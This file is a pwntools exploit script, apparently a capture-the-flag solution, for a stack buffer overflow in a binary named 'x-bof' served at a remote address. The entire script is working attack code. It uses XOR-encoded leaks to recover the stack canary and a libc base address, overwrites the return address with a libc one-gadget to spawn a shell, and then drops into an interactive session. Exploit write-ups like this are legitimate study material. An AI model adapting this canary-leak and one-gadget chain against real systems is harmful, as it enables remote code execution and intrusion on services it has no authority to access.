from pwn import *
p = remote("20.199.64.76", 6542)
#p = process("./x-bof")
elf = ELF("./x-bof")
libc = elf.libc
def getkey():
    p.recvuntil("key ")
    key = int(p.recv(4), 16)
    return key
key = getkey()
p.sendline(b"A" * 72)
#print(p.recvline())
p.recvuntil("Result: ")
p.recv(72)
leak = p.recvline().strip(b"\n")#.ljust(8, b"\x00"))
print(leak)
l = bytearray(8)
#print(hex(leak))
for i in range(len(leak)):
    l[i] = leak[i] ^ key
canary = u64(bytes(l).ljust(8,b"\x00")) - 0x0a
print(hex(canary))

key = getkey()
print(hex(key))
p.sendline(b"A" * 72 + b"A" * 16)
p.recvuntil("Result: ")
p.recv(88)
leak = p.recvline().strip(b"\n")
print(leak)
l = bytearray(8)
for i in range(len(leak)):
    l[i] = leak[i] ^ key
libc_leak = u64(bytes(l).ljust(8,b"\x00")) - 0x0a - 0x24000
print(hex(libc_leak))
payload = b"A" * 72 + p64(canary) + p64(0) + p64(libc_leak + 0xe3b01)
p.sendline(payload)
print("x: ", p.recv())
key = getkey()
print(key)
print(p.recv())
l = bytearray(5)
word = b"quit\x00"
for i in range(len(word)):
    l[i] = word[i] ^ key
print(bytes(l))
#gdb.attach(p, gdbscript = """
#    break *main+133
#    break *main+152
#""")
p.sendline(bytes(l) + b"\0")
#gdb.attach(p)
p.interactive()
